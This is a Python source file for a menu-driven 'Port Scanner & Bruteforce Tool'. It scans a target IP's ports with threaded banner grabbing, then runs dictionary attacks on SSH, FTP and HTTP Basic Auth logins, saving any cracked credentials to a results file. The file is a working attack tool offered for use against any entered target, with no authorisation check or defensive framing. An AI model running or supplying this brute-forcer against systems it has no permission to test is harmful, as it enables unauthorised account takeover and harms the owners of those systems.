import socket
import threading
import paramiko
import ftplib
import requests
from queue import Queue
import time
import os

# Configuration
THREADS = 10
TIMEOUT = 3


def clear_screen():
    """Clear the console screen"""
    os.system('cls' if os.name == 'nt' else 'clear')


def display_banner():
    """Display program banner"""
    clear_screen()
    print(r"""
 _    _            _       _____                  
| |  | |          (_)     / ____|                 
| |__| | __ _ _ __ _  ___| (___   ___ __ _ _ __  
|  __  |/ _` | '__| |/ __|\___ \ / __/ _` | '_ \ 
| |  | | (_| | |  | | (__ ____) | (_| (_| | | | |
|_|  |_|\__,_|_|  |_|\___|_____/ \___\__,_|_| |_|

       Port Scanner & Bruteforce Tool
    """)


class PortScanner:
    @staticmethod
    def grab_banner(host, port, open_ports, closed_ports):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            result = sock.connect_ex((host, port))
            if result == 0:
                try:
                    banner = sock.recv(1024).decode().strip()
                except:
                    banner = None

                service = "Unknown"
                if banner:
                    if "SSH" in banner:
                        service = "SSH"
                    elif "HTTP" in banner:
                        service = "HTTP"
                    elif "Apache" in banner:
                        service = "Apache"
                    elif "nginx" in banner:
                        service = "Nginx"

                    open_ports.append((port, service, banner))
                else:
                    open_ports.append((port, "Unknown", "No banner"))
            else:
                closed_ports.append(port)
        except:
            closed_ports.append(port)
        finally:
            sock.close()

    @staticmethod
    def scan_ports(host, start_port, end_port):
        open_ports = []
        closed_ports = []
        threads = []

        print(f"\n[+] Scanning {host} from port {start_port} to {end_port}")

        for port in range(start_port, end_port + 1):
            t = threading.Thread(target=PortScanner.grab_banner, args=(host, port, open_ports, closed_ports))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        return open_ports, closed_ports

    @staticmethod
    def run_scan():
        display_banner()
        print("\n[ PORT SCAN MODE ]")
        target = input("\nEnter target IP: ")
        start_port = int(input("Start port: "))
        end_port = int(input("End port: "))

        open_ports, closed_ports = PortScanner.scan_ports(target, start_port, end_port)

        print("\n[+] Scan Results:")
        print("\nOpen Ports:")
        for port, service, banner in open_ports:
            print(f"  Port {port}: {service} - {banner}")

        print("\nClosed Ports:")
        grouped = PortScanner.group_ports(closed_ports)
        for group in grouped:
            print(f"  {group}")

        input("\nPress Enter to return to menu...")

    @staticmethod
    def group_ports(ports):
        ports.sort()
        grouped = []
        start = ports[0] if ports else None
        end = start

        for port in ports[1:]:
            if port == end + 1:
                end = port
            else:
                if start == end:
                    grouped.append(str(start))
                else:
                    grouped.append(f"{start}-{end}")
                start = port
                end = port

        if start is not None:
            if start == end:
                grouped.append(str(start))
            else:
                grouped.append(f"{start}-{end}")

        return grouped


class BruteforceAttack:
    def __init__(self, target_ip, port):
        self.target_ip = target_ip
        self.port = port
        self.found_credentials = []
        self.queue = Queue()
        self.protocol = self.detect_protocol()

    def detect_protocol(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((self.target_ip, self.port))

            try:
                banner = sock.recv(1024).decode().strip().lower()
                if 'ssh' in banner:
                    return 'ssh'
                elif 'ftp' in banner:
                    return 'ftp'
                elif 'http' in banner or 'html' in banner:
                    return 'http'
            except:
                pass

            if self.port == 22:
                return 'ssh'
            elif self.port == 21:
                return 'ftp'
            elif self.port == 80 or self.port == 443:
                return 'http'

            return 'unknown'
        except:
            return 'unknown'
        finally:
            sock.close()

    def load_credentials(self, username_file, password_file):
        try:
            with open(username_file, 'r', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]

            with open(password_file, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]

            for user in usernames:
                for pwd in passwords:
                    self.queue.put((user, pwd))

            print(f"[+] Loaded {len(usernames)} usernames and {len(passwords)} passwords")
            return True
        except Exception as e:
            print(f"[!] Error loading credentials: {e}")
            return False

    def brute_ssh(self):
        while not self.queue.empty() and not self.found_credentials:
            user, pwd = self.queue.get()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    self.target_ip,
                    port=self.port,
                    username=user,
                    password=pwd,
                    timeout=TIMEOUT + 5,
                    banner_timeout=30,
                    auth_timeout=30
                )
                print(f"[+] SSH Success: {user}:{pwd}")
                self.found_credentials.append(f"SSH - {user}:{pwd}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                pass
            except paramiko.SSHException as e:
                if "Error reading SSH protocol banner" in str(e):
                    print(f"[!] SSH Banner Error on port {self.port}")
                else:
                    print(f"[!] SSH Error: {e}")
            except Exception as e:
                print(f"[!] Error: {e}")
            finally:
                try:
                    ssh.close()
                except:
                    pass
                self.queue.task_done()

    def brute_ftp(self):
        while not self.queue.empty() and not self.found_credentials:
            user, pwd = self.queue.get()
            try:
                ftp = ftplib.FTP()
                ftp.connect(self.target_ip, self.port, timeout=TIMEOUT)
                ftp.login(user=user, passwd=pwd)
                print(f"[+] FTP Success: {user}:{pwd}")
                self.found_credentials.append(f"FTP - {user}:{pwd}")
                ftp.quit()
                return
            except ftplib.error_perm:
                pass
            except Exception as e:
                print(f"[!] FTP Error: {e}")
            finally:
                self.queue.task_done()

    def brute_http_basic_auth(self):
        while not self.queue.empty() and not self.found_credentials:
            user, pwd = self.queue.get()
            try:
                scheme = "https" if self.port == 443 else "http"
                url = f"{scheme}://{self.target_ip}:{self.port}"
                response = requests.get(url, auth=(user, pwd), timeout=TIMEOUT)
                if response.status_code == 200:
                    print(f"[+] HTTP Basic Auth Success: {user}:{pwd}")
                    self.found_credentials.append(f"HTTP Basic Auth - {user}:{pwd}")
                    return
            except Exception as e:
                print(f"[!] HTTP Error: {e}")
            finally:
                self.queue.task_done()

    def run_attack(self, username_file, password_file):
        print(f"\n[+] Attacking {self.target_ip}:{self.port} ({self.protocol})")

        if not self.load_credentials(username_file, password_file):
            return

        threads = []
        for _ in range(THREADS):
            if self.protocol == 'ssh':
                t = threading.Thread(target=self.brute_ssh)
            elif self.protocol == 'ftp':
                t = threading.Thread(target=self.brute_ftp)
            elif self.protocol == 'http':
                t = threading.Thread(target=self.brute_http_basic_auth)
            else:
                print(f"[!] Unsupported protocol on port {self.port}")
                return

            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if not self.found_credentials:
            print(f"[-] No valid credentials found for {self.target_ip}:{self.port}")


def bruteforce_menu():
    display_banner()
    print("\n[ BRUTEFORCE MODE ]")

    try:
        target_ip = input("\nEnter target IP: ")
        ports_input = input("Enter ports to attack (comma separated): ")
        ports = [int(p.strip()) for p in ports_input.split(',')]

        print("\n[+] Dictionary Files:")
        username_file = input("Username dictionary path: ").strip()
        password_file = input("Password dictionary path: ").strip()

        if not os.path.exists(username_file) or not os.path.exists(password_file):
            print("[!] One or both dictionary files not found")
            input("Press Enter to continue...")
            return

        results = []
        for port in ports:
            attack = BruteforceAttack(target_ip, port)
            attack.run_attack(username_file, password_file)
            if attack.found_credentials:
                results.append(f"Port {port} ({attack.protocol}): {attack.found_credentials[0]}")

        print("\n[+] Attack Results:")
        if results:
            for result in results:
                print(f"  - {result}")

            with open("bruteforce_results.txt", "w") as f:
                f.write(f"Target: {target_ip}\n")
                f.write(f"Date: {time.ctime()}\n\n")
                for result in results:
                    f.write(f"{result}\n")
            print("\nResults saved to 'bruteforce_results.txt'")
        else:
            print("  - No successful attacks")

        input("\nPress Enter to return to menu...")
    except Exception as e:
        print(f"[!] Error: {e}")
        input("Press Enter to continue...")


def main_menu():
    while True:
        display_banner()
        print("\nMain Menu:")
        print("1. Port Scan")
        print("2. Bruteforce Attack")
        print("3. Exit")

        choice = input("\nSelect an option: ")

        if choice == "1":
            PortScanner.run_scan()
        elif choice == "2":
            bruteforce_menu()
        elif choice == "3":
            print("\n[+] Exiting...")
            break
        else:
            print("\n[!] Invalid choice")
            time.sleep(1)


if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n[!] Program interrupted by user")
    except Exception as e:
        print(f"\n[!] Critical error: {e}")